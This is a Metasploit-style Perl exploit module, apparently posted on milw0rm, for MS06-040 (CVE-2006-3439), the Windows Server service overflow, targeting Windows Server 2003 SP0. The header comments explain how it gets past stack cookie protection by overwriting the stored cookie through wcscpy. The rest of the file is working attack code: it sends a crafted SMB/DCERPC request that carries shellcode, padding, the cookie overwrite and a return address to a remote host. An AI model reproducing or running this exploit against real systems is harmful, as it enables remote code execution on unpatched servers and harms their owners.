#########################################################################
# netapi_win2003.pm (MS06-040 Exploit for Windows Server 2003 SP0)
#
# Author: Trirat Puttaraksa (Kira) <trir00t [at] gmail.com>
#
# http://sf-freedom.blogspot.com
# 
# For educational purpose only
#
# Note: This exploit is developed because of my question "Is it exploitable
# on Windows Server 2003 platform ?". As I know, Windows XP SP2 and Windows
# Server 2003 SP1 is not exploitable because they are compiled with /GS, but
# how about Windows Server 2003 SP0 ? In metasploit netapi_ms06_040.pm there
# is no Windows Server 2003 sp0 target, this means 2003 SP0 is not 
# exploitable ? There is Stack Protection Windows Server 2003, is this the
# reasons why there is no Windows Server 2003 SP0 exploit for MS06-040 ?
#
# I start to modify H D Moore's exploit (netapi_ms06_040.pm - credits to him
# ^-^) and work on it. The problem is the Stack Protection "security cookie 
# checking". Because wcscpy() method allow me to write to any memory location
# that are marked writable, I decide to write to the location at "security
# cookie" is stored and it works !!! I will describe more implementation details
# in my blog in few days ^-^ 
#
# This exploit tested on Windows Server 2003 SP0 build 3790 and successful 
# exploit 2003 machine in my environment - all patch before MS06-040 
# (KB921883). It's quite reliable but not 100%. There is the possibility that
# the exploit will fail and the target system process crash. Because I have 
# only one testbase system, I couldn't confirm this exploit will work on 
# your environment. However feel free to e-mail to me.
#
# Credits: H D Moore
#########################################################################

package Msf::Exploit::netapi_win2003;
use base "Msf::Exploit";
use strict;

use Pex::DCERPC;
use Pex::NDR;

my $advanced = {
	'FragSize'    => [ 256, 'The DCERPC fragment size' ],
	'BindEvasion' => [ 0,   'IDS Evasion of the bind request' ],
	'DirectSMB'   => [ 0,   'Use direct SMB (445/tcp)' ],
  };

my $info = {
	'Name'    => 'MSO6-040 Windows Server 2003 Target',
	'Version' => '',
	'Authors' =>
	  [
		'Trirat Puttaraksa (Kira) <trir00t [at] gmail.com>',
	  ],

	'Arch' => ['x86'],
	'OS'   => [ 'win32', 'win2003' ],
	'Priv' => 1,

	'AutoOpts' => { 'EXITFUNC' => 'thread' },
	
	'UserOpts' =>
	  {
		'RHOST' => [ 1, 'ADDR', 'The target address' ],

		# SMB connection options
		'SMBUSER' => [ 0, 'DATA', 'The SMB username to connect with', '' ],
		'SMBPASS' => [ 0, 'DATA', 'The password for specified SMB username', '' ],
		'SMBDOM'  => [ 0, 'DATA', 'The domain for specified SMB username', '' ],
	  },

	'Payload' =>
	  {
	  	# Technically we can use more space than this, but by limiting it
		# to 370 bytes we can use the same request for all Windows SPs.
		'Space'    => 370,
		
		'BadChars' => "\x00\x0a\x0d\x5c\x5f\x2f\x2e",
		'Keys'     => ['+ws2ord'],

		# sub esp, 4097 + inc esp makes stack happy
		'Prepend' => "\x81\xc4\xff\xef\xff\xff\x44",
	  },

	'Description' => Pex::Text::Freeform(
		qq{
		This exploit modified from netapi_ms06_040.pm (Metasploit).
		While netapi_ms06_040 of metasploit works on Windows 2000 
		SP0 - SP4 and Windows XP SP0 - SP1, this exploit works on
		Windows Server 2003 SP0.
	  }
	  ),

	'Refs' =>
	  [
		[ 'BID', '19409' ],
		[ 'CVE', '2006-3439' ],
		[ 'MSB', 'MS06-040' ],
	  ],

	'DefaultTarget' => 0,
	'Targets'       =>
	  [
		[ '(wcscpy) Windows Server 2003 SP0', 612],
	  ],

	'Keys' => ['srvsvc'],

	'DisclosureDate' => '',
  };

sub new {
	my ($class) = @_;
	my $self =
	  $class->SUPER::new( { 'Info' => $info, 'Advanced' => $advanced }, @_ );
	return ($self);
}

sub Exploit {
	my ($self)      = @_;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target_name = '*SMBSERVER';

	my $FragSize = $self->GetVar('FragSize') || 256;
	my $target   = $self->Targets->[$target_idx];

	if (!$self->InitNops(128)) {
		$self->PrintLine("Could not initialize the nop module");
		return;
	}

	my ( $res, $rpc );

	my $pipe    = '\BROWSER';
	my $uuid    = '4b324fc8-1670-01d3-1278-5a47bf6ee188';
	my $version = '3.0';

	my $handle = Pex::DCERPC::build_handle( $uuid, $version, 'ncacn_np', $target_host, $pipe );

	my $dce = Pex::DCERPC->new(
		'handle'      => $handle,
		'username'    => $self->GetVar('SMBUSER'),
		'password'    => $self->GetVar('SMBPASS'),
		'domain'      => $self->GetVar('SMBDOM'),
		'fragsize'    => $self->GetVar('FragSize'),
		'bindevasion' => $self->GetVar('BindEvasion'),
		'directsmb'   => $self->GetVar('DirectSMB'),
	  );

	if ( !$dce ) {
		$self->PrintLine("[*] Could not bind to $handle");
		return;
	}

	my $smb = $dce->{'_handles'}{$handle}{'connection'};
	
	if (! $smb) {
		$self->PrintLine("[*] Could not establish SMB session");
		return;
	}

	my $stub;

	#
	# Use the wcscpy() method on Windows Server 2003 SP0
	#	
	if ($target->[0] =~ /2003/) {

		my $path = 	
			$shellcode.

			# Padding
			Pex::Text::AlphaNumText($target->[1] - length($shellcode)).
			Pex::Text::AlphaNumText(32).
			substr($shellcode, 0, 4).	# cookie
			Pex::Text::AlphaNumText(4).
			# return address == address that store security cookie
			("\xec\xc1\xc8\x71") . 
			Pex::Text::AlphaNumText(8).

			("\xec\xc1\xc8\x71" x 2) .
			Pex::Text::AlphaNumText(36).

			# Terminate
			"\x00\x00";


		# Package that into a stub
		$stub =
			Pex::NDR::Long(int(rand(0xffffffff))).
			Pex::NDR::UnicodeConformantVaryingString('').
			Pex::NDR::UnicodeConformantVaryingStringPreBuilt($path).
			Pex::NDR::Long(int(rand(250)+1)).
			Pex::NDR::UnicodeConformantVaryingString('').
			Pex::NDR::Long(int(rand(250)+1)).
			Pex::NDR::Long(0);
	}
	else {
		$self->PrintLine("This target is not currently supported");
		return;
	}


	$self->PrintLine("[*] Sending request...");
	
	# Function 0x1f is not the only way to exploit this :-)
	my @response = $dce->request( $handle, 0x1f, $stub );
	
	if ( length($dce->{'response'}->{'StubData'}) > 0) {
		$self->PrintLine("[*] The server rejected it, trying again...");
		@response = $dce->request( $handle, 0x1f, $stub );
	}
	
	if ( length($dce->{'response'}->{'StubData'}) > 0) {
		$self->PrintLine("[*] Exploit Failed");
	}
	
	if (@response) {
		$self->PrintLine('[*] RPC server responded with:');
		foreach my $line (@response) {
			$self->PrintLine( '[*] ' . $line );
		}
	}

	return;
}

1;

# milw0rm.com [2006-09-13]
